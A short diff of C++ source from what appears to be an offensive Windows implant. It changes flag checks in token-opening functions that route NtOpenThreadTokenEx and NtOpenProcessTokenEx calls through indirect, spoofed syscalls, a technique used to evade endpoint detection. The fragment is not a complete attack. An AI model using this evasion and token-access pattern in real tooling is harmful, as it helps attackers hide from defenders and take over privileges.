@@ -417,11 +417,11 @@ auto DECLFN Token::TdOpen(
         return result;
     }
 
-    UPTR Address = (Flags & SYSCALL_SPOOF_INDIRECT)
+    UPTR Address = (Flags == SYSCALL_SPOOF_INDIRECT)
         ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].Instruction
         : (UPTR)Self->Ntdll.NtOpenThreadTokenEx;
 
-    UPTR ssn = (Flags & SYSCALL_SPOOF_INDIRECT)
+    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT)
         ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].ssn
         : 0;
 
@@ -449,11 +449,11 @@ auto DECLFN Token::ProcOpen(
         return result;
     }
 
-    UPTR Address = ( Flags & SYSCALL_SPOOF_INDIRECT )
+    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
         ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].Instruction
         : (UPTR)Self->Ntdll.NtOpenProcessTokenEx;
 
-    UPTR ssn = ( Flags & SYSCALL_SPOOF_INDIRECT )
+    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
         ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].ssn
         : 0;
 
